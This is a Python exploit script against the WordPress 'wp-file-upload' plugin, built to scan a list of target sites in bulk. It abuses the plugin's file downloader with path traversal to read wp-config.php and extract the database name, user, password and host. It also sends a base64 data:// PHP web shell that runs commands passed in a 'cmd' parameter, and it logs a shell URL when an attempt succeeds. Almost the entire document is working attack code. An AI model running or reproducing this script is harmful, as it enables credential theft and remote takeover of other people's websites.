#!/usr/bin/env python3
import os
import sys
import json
import base64
import tempfile
import requests
import argparse
import time
import re
from urllib.parse import urlparse, urljoin

class WFUExploit:
    def __init__(self, wordpress_url):
        self.wordpress_url = wordpress_url.rstrip('/')
        self.plugin_url = urljoin(self.wordpress_url, '/wp-content/plugins/wp-file-upload/wfu_file_downloader.php')
        self.output = ""
        self.vulnerable = False
        
    def log(self, message):
        self.output += message + "\n"
        
    def create_payload(self, target_file, abspath):
        return json.dumps({
            'type': 'normal',
            'ticket': 'ABC123',
            'filepath': target_file,
            'handler': '',
            'expire': int(time.time()) + 3600,
            'wfu_ABSPATH': abspath,
            'wfu_browser_downloadfile_notexist': 'File not found',
            'wfu_browser_downloadfile_failed': 'Download failed'
        }, ensure_ascii=False, separators=(',', ':'))
    
    def extract_content(self, response):
        if b'\r\n\r\n' in response:
            try:
                headers, body = response.split(b'\r\n\r\n', 1)
                return body.decode('utf-8', errors='ignore')
            except:
                return response.decode('utf-8', errors='ignore')
        return response.decode('utf-8', errors='ignore')
    
    def parse_wp_config(self, content):
        config = {}
        patterns = {
            'DB_NAME': r"define\(\s*'DB_NAME',\s*'([^']+)'",
            'DB_USER': r"define\(\s*'DB_USER',\s*'([^']+)'",
            'DB_PASSWORD': r"define\(\s*'DB_PASSWORD',\s*'([^']+)'",
            'DB_HOST': r"define\(\s*'DB_HOST',\s*'([^']+)'",
            'TABLE_PREFIX': r"\$table_prefix\s*=\s*'([^']+)'"
        }
        
        for key, pattern in patterns.items():
            match = re.search(pattern, content)
            config[key] = match.group(1) if match else 'Not found'
        
        return config

    def test_vulnerability(self):
        self.log(f"\n{'='*60}")
        self.log(f"[*] Testing: {self.wordpress_url}")
        self.log(f"{'='*60}")
        
        wordpress_paths = [
            'C:/xampp/htdocs/wordpress/',
            'C:/xampp/htdocs/',
            '/var/www/html/wordpress/',
            '/var/www/html/',
            '../../../../',
            '../../../',
            '../../',
            '../',
            './'
        ]
        
        # Test 1: Read wp-config.php
        self.log("\n[+] Attempting to read wp-config.php")
        wp_config_found = False
        for wp_path in wordpress_paths:
            payload = self.create_payload("wp-config.php", wp_path)
            
            with tempfile.NamedTemporaryFile(mode='w+', suffix='.json', delete=False) as tmp:
                tmp.write(payload)
                tmp_path = tmp.name
            
            files = {'source': (os.path.basename(tmp_path), open(tmp_path, 'rb'))}
            
            try:
                response = requests.post(
                    self.plugin_url,
                    files=files,
                    verify=False,
                    timeout=15,
                    allow_redirects=True
                )
                content = self.extract_content(response.content)
            except Exception as e:
                content = f"Request failed: {str(e)}"
            finally:
                os.unlink(tmp_path)
                if os.path.exists(tmp_path):
                    os.remove(tmp_path)
            
            if "DB_NAME" in content:
                self.log(f"[SUCCESS] Found wp-config.php using path: {wp_path}")
                self.log("\n[+] WordPress Configuration:")
                config = self.parse_wp_config(content)
                for key, value in config.items():
                    self.log(f"    {key:15}: {value}")
                wp_config_found = True
                self.vulnerable = True
                break
            else:
                self.log(f"[Tried path]: {wp_path} - Failed")
        
        # Test 2: RCE Attempt
        self.log("\n[+] Attempting Remote Code Execution")
        php_shell = '<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } ?>'
        encoded_shell = base64.b64encode(php_shell.encode()).decode()
        target_file = f"data://text/plain;base64,{encoded_shell}"
        
        for wp_path in wordpress_paths:
            payload = self.create_payload(target_file, wp_path)
            
            with tempfile.NamedTemporaryFile(mode='w+', suffix='.json', delete=False) as tmp:
                tmp.write(payload)
                tmp_path = tmp.name
            
            files = {'source': (os.path.basename(tmp_path), open(tmp_path, 'rb'))}
            
            try:
                response = requests.post(
                    self.plugin_url,
                    files=files,
                    verify=False,
                    timeout=15,
                    allow_redirects=True
                )
                content = self.extract_content(response.content)
            except Exception as e:
                content = f"Request failed: {str(e)}"
            finally:
                os.unlink(tmp_path)
                if os.path.exists(tmp_path):
                    os.remove(tmp_path)
            
            if 'Failed to open stream' not in content and response.status_code == 200:
                self.log(f"[SUCCESS] Shell uploaded using path: {wp_path}")
                self.log(f"    Shell URL: {self.wordpress_url}/shell.php?cmd=whoami")
                self.vulnerable = True
                break
            else:
                self.log(f"[Tried path]: {wp_path} - Failed")
        
        if not self.vulnerable:
            self.log("\n[!] Target not vulnerable to WFU exploits")
        else:
            self.log("\n[+] Target is VULNERABLE!")

def main():
    parser = argparse.ArgumentParser(description='WordPress File Upload Exploit Scanner')
    parser.add_argument('-i', '--input', required=True, help='File containing list of WordPress URLs (one per line)')
    args = parser.parse_args()

    # Create result directory
    os.makedirs("Result", exist_ok=True)
    output_file = "Result/WFU2RCE.txt"

    # Read target URLs
    try:
        with open(args.input, 'r') as f:
            urls = [line.strip() for line in f.readlines() if line.strip()]
    except FileNotFoundError:
        print(f"[!] Error: File '{args.input}' not found")
        sys.exit(1)

    print(f"\n[+] Starting scan for {len(urls)} targets")
    print(f"[+] Output will be saved to: {output_file}\n")

    with open(output_file, 'w') as out_f:
        for i, url in enumerate(urls, 1):
            # Add scheme if missing
            if not urlparse(url).scheme:
                url = 'http://' + url
                
            exploit = WFUExploit(url)
            exploit.test_vulnerability()
            
            # Write to file and console
            result = f"\n[Result {i}/{len(urls)}] - {url}\n"
            result += exploit.output
            result += "\n" + "="*80 + "\n"
            
            out_f.write(result)
            out_f.flush()
            
            # Print to console
            print(result)
            
            # Pause between targets
            time.sleep(1)

    print(f"\n[+] Scan completed! Results saved to {output_file}")

if __name__ == "__main__":
    main()